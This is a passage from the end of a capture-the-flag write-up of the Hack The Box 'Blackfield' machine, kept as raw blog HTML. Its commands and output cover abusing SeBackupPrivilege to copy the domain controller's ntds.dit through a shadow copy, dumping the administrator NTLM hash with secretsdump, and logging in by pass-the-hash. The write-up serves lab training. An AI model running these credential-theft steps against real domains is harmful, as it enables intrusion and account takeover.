</span><span class="nf">On</span><span class="w"> </span><span class="nx">computer:</span><span class="w">  </span><span class="nx">DC01</span><span class="p">,</span><span class="w">  </span><span class="nx">6/10/2020</span><span class="w"> </span><span class="nx">3:41:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">

</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">SET</span><span class="w"> </span><span class="nx">CONTEXT</span><span class="w"> </span><span class="nx">PERSISTENT</span><span class="w"> </span><span class="nx">NOWRITERS</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">add</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">c:</span><span class="w"> </span><span class="nx">alias</span><span class="w"> </span><span class="nx">0xprashant</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="nf">create</span><span class="w">
</span><span class="nx">Alias</span><span class="w"> </span><span class="nx">0xprashant</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="p">{</span><span class="mi">84</span><span class="nf">b7f11c-93da-4701-9af4-2c0adfc7cb2e</span><span class="p">}</span><span class="w"> </span><span class="nf">set</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">environment</span><span class="w"> </span><span class="nx">variable.</span><span class="w">
</span><span class="nf">Alias</span><span class="w"> </span><span class="nx">VSS_SHADOW_SET</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="p">{</span><span class="nf">c38f96e5-6d7e-49f8-b605-25b0b25934e9</span><span class="p">}</span><span class="w"> </span><span class="nf">set</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">environment</span><span class="w"> </span><span class="nx">variable.</span><span class="w">

</span><span class="nf">Querying</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copies</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="p">{</span><span class="nf">c38f96e5-6d7e-49f8-b605-25b0b25934e9</span><span class="p">}</span><span class="w">

        </span><span class="o">*</span><span class="w"> </span><span class="nf">Shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">84</span><span class="nf">b7f11c-93da-4701-9af4-2c0adfc7cb2e</span><span class="p">}</span><span class="w">               </span><span class="o">%</span><span class="mi">0</span><span class="nf">xprashant</span><span class="o">%</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="nf">Shadow</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">set:</span><span class="w"> </span><span class="p">{</span><span class="nf">c38f96e5-6d7e-49f8-b605-25b0b25934e9</span><span class="p">}</span><span class="w">       </span><span class="o">%</span><span class="nf">VSS_SHADOW_SET</span><span class="o">%</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="nf">Original</span><span class="w"> </span><span class="nx">count</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">shadow</span><span class="w"> </span><span class="nx">copies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="nf">Original</span><span class="w"> </span><span class="nx">volume</span><span class="w"> </span><span class="nx">name:</span><span class="w"> </span><span class="nx">\\</span><span class="nf">?</span><span class="nx">\Volume</span><span class="p">{</span><span class="nx">351b4712-0000-0000-0000-602200000000</span><span class="p">}</span><span class="nf">\</span><span class="w"> </span><span class="p">[</span><span class="nf">C:\</span><span class="p">]</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="kt">Creation</span><span class="w"> </span><span class="kt">time</span><span class="p">:</span><span class="w"> </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w"> </span><span class="nx">3:41:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="kt">Shadow</span><span class="w"> </span><span class="kt">copy</span><span class="w"> </span><span class="kt">device</span><span class="w"> </span><span class="kt">name</span><span class="p">:</span><span class="w"> </span><span class="nf">\\?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="nx">Originating</span><span class="w"> </span><span class="nx">machine:</span><span class="w"> </span><span class="nx">DC01.BLACKFIELD.local</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="kt">Service</span><span class="w"> </span><span class="kt">machine</span><span class="p">:</span><span class="w"> </span><span class="no">DC01.BLACKFIELD.</span><span class="kt">local</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="kt">Not</span><span class="w"> </span><span class="kt">exposed</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="kt">Provider</span><span class="w"> </span><span class="kt">ID</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="kt">b5946137</span><span class="nt">-7b9f-4925-af80-51abd60b20d5</span><span class="p">}</span><span class="w">
                </span><span class="nf">-</span><span class="w"> </span><span class="kt">Attributes</span><span class="p">:</span><span class="w">  </span><span class="kt">No_Auto_Release</span><span class="w"> </span><span class="kt">Persistent</span><span class="w"> </span><span class="kt">No_Writers</span><span class="w"> </span><span class="kt">Differential</span><span class="w">

</span><span class="kt">Number</span><span class="w"> </span><span class="kt">of</span><span class="w"> </span><span class="kt">shadow</span><span class="w"> </span><span class="kt">copies</span><span class="w"> </span><span class="kt">listed</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="kt">expose</span><span class="w"> </span><span class="o">%</span><span class="mi">0</span><span class="kt">xprashant</span><span class="o">%</span><span class="w"> </span><span class="nf">z:</span><span class="w">
</span><span class="nf">-</span><span class="err">&gt;</span><span class="w"> </span><span class="o">%</span><span class="nx">0xprashant</span><span class="o">%</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">84</span><span class="kt">b7f11c</span><span class="nt">-93da-4701-9af4-2c0adfc7cb2e</span><span class="p">}</span><span class="w">
</span><span class="kt">The</span><span class="w"> </span><span class="kt">shadow</span><span class="w"> </span><span class="kt">copy</span><span class="w"> </span><span class="kt">was</span><span class="w"> </span><span class="kt">successfully</span><span class="w"> </span><span class="kt">exposed</span><span class="w"> </span><span class="kt">as</span><span class="w"> </span><span class="nf">z:\.</span><span class="w">
</span></pre></table></code></div></div><p>This time it ran <code class="language-plaintext highlighter-rouge">smoothly</code>â€¦.</p><p>Now its ime to copy the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file , There is a tool on github that will do this thing for meâ€¦.</p><blockquote><p><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug" target="_blank">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></p></blockquote><p>Upload the two dll files to the machine and then simply <code class="language-plaintext highlighter-rouge">import</code> them</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">/home/prashant/SeBackupPrivilegeCmdLets.dll</span><span class="w">
</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Uploading</span><span class="w"> </span><span class="nx">/home/prashant/SeBackupPrivilegeCmdLets.dll</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\temp\SeBackupPrivilegeCmdLets.dll</span><span class="w">

                                                             
</span><span class="kr">Data</span><span class="p">:</span><span class="w"> </span><span class="mi">16384</span><span class="w"> </span><span class="nf">bytes</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">16384</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">copied</span><span class="w">

</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Upload</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">/home/prashant/SeBackupPrivilegeUtils.dll</span><span class="w">
</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Uploading</span><span class="w"> </span><span class="nx">/home/prashant/SeBackupPrivilegeUtils.dll</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\temp\SeBackupPrivilegeUtils.dll</span><span class="w">

                                                             
</span><span class="kr">Data</span><span class="p">:</span><span class="w"> </span><span class="mi">21844</span><span class="w"> </span><span class="nf">bytes</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">21844</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">copied</span><span class="w">

</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Upload</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>Importing the scripts</p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeUtils.dll</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SeBackupPrivilegeCmdLets.dll</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>Copying the <code class="language-plaintext highlighter-rouge">NTDS.dit</code></p></blockquote><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Copy-FileSebackupPrivilege</span><span class="w"> </span><span class="nx">z:\Windows\NTDS\ntds.dit</span><span class="w"> </span><span class="nx">C:\temp\ndts.dit</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">


    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\temp</span><span class="w">


</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w">   </span><span class="nx">3:37</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">98</span><span class="w"> </span><span class="nx">0xprashant.txt</span><span class="w">
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w">   </span><span class="nx">3:39</span><span class="w"> </span><span class="nx">PM</span><span class="w">            </span><span class="nx">636</span><span class="w"> </span><span class="nx">2020-06-10_15-39-54_DC01.cab</span><span class="w">
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w">   </span><span class="nx">3:41</span><span class="w"> </span><span class="nx">PM</span><span class="w">            </span><span class="nx">627</span><span class="w"> </span><span class="nx">2020-06-10_15-41-18_DC01.cab</span><span class="w">
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w">   </span><span class="nx">3:51</span><span class="w"> </span><span class="nx">PM</span><span class="w">       </span><span class="nx">18874368</span><span class="w"> </span><span class="nx">ndts.dit</span><span class="w">
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w">   </span><span class="nx">3:46</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">12288</span><span class="w"> </span><span class="nx">SeBackupPrivilegeCmdLets.dll</span><span class="w">
</span><span class="nt">-a</span><span class="nf">----</span><span class="w">        </span><span class="mi">6</span><span class="nf">/10/2020</span><span class="w">   </span><span class="nx">3:48</span><span class="w"> </span><span class="nx">PM</span><span class="w">          </span><span class="nx">16384</span><span class="w"> </span><span class="nx">SeBackupPrivilegeUtils.dll</span><span class="w">
</span></pre></table></code></div></div><p>And we got it â€¦..now its time for the <code class="language-plaintext highlighter-rouge">system</code> file</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SYSTEM</span><span class="w"> </span><span class="nx">c:\temp\system</span><span class="w">
</span><span class="nf">The</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>And download both the filesâ€¦.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">download</span><span class="w"> </span><span class="nx">system</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">download</span><span class="w"> </span><span class="nx">ntds.dit</span><span class="w">
</span></pre></table></code></div></div><h1 id="dumping-ntlm-from-ntdsdit-and-system">Dumping NTLM from ntds.dit and system</h1><p>Now i have both the files â€¦. i can use <code class="language-plaintext highlighter-rouge">secretdump.py</code> to dump the <strong>ntlm</strong> hash from them</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>âžœ  blackfield python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system <span class="nt">-hashes</span> lmhash:nthash LOCAL <span class="nt">-output</span> nt-hash
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
</pre></table></code></div></div><p>And here we got the <code class="language-plaintext highlighter-rouge">NTLM</code> hash for the user <code class="language-plaintext highlighter-rouge">administrator</code></p><h1 id="login-as-administrator">Login as administrator</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">âžœ</span><span class="w">  </span><span class="nf">blackfield</span><span class="w"> </span><span class="nx">evil-winrm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">10.10.10.192</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">184fb5e5178480be64824d4cd53b99ee</span><span class="w"> 

</span><span class="nf">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v2.3</span><span class="w">

</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Establishing</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">endpoint</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span><span class="nf">blackfield\administrator</span><span class="w">
</span></pre></table></code></div></div><h2 id="got-roottxt">Got root.txt</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="mi">6</span><span class="nf">d1--------------------------f67</span><span class="w">
</span><span class="o">*</span><span class="nx">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>And we pwned it â€¦â€¦.</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> <a href="https://0xprashant.github.io/tabs/donation/" target="_blank">Donation for OSCP</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side â€“ &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>rpcclient enum<td><a href="https://ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging" target="_blank">https://ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging</a><tr><td>reset password in rpcclient<td><a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/" target="_blank">https://malicious.link/post/2017/reset-ad-user-password-with-linux/</a><tr><td>dump the lsass.dmp<td><a href="https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf" target="_blank">https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf</a><tr><td>mimikatz<td><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank">https://github.com/gentilkiwi/mimikatz/releases</a><tr><td>Attacking the seBackupPrivilege<td><a href="https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf" target="_blank">https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf</a><tr><td>copy-ntds.dit tool<td><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug" target="_blank">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active-Directory</a> <a href="/tags/rpcclient/" class="post-tag no-text-decoration" >rpcclient</a> <a href="/tags/secretdump/" class="post-tag no-text-decoration" >secretdump</a> <a href="/tags/mimikatz/" class="post-tag no-text-decoration" >mimikatz</a> <a href="/tags/sebackupprivilege/" class="post-tag no-text-decoration" >SeBackupPrivilege</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Blackfield writeup - 0xPrashant&url=http://localhost:4000/posts/htb-blackfield/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Blackfield writeup - 0xPrashant&u=http://localhost:4000/posts/htb-blackfield/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Blackfield writeup - 0xPrashant&url=http://localhost:4000/posts/htb-blackfield/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-fuse/"><div class="card-body"> <span class="timeago small" > Jun 16 <i class="unloaded">2020-06-16T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Fuse writeup</h3><div class="text-muted small"><p> Introduction@Fuse:~$ Column Details Name Fuse IP 10.10.10.193 Points 30 Os Window...</p></div></div></a></div><div class="card"> <a href="/posts/htb-traverxec/"><div class="card-body"> <span class="timeago small" > Feb 15 <i class="unloaded">2020-02-15T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Traverxec writeup</h3><div class="text-muted small"><p> information Column Details Name Traverxec IP 10.10.10.165 Points 20 Os Linux ...</p></div></div></a></div><div class="card"> <a href="/posts/hackthebox-sauna/"><div class="card-body"> <span class="timeago small" > Feb 22 <i class="unloaded">2020-02-22T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Sauna writeup</h3><div class="text-muted small"><p> information@Sauna:~$ Column Details Name Sauna IP 10.10.10.175 Points 20 Os Windo...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-blunder/" class="btn btn-outline-primary"><p>Hackthebox Blunder writeup</p></a> <a href="/posts/htb-akerva/" class="btn btn-outline-primary"><p>Fortress Akerva writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-blackfield/'; this.page.identifier = '/posts/htb-blackfield/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> Â© 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
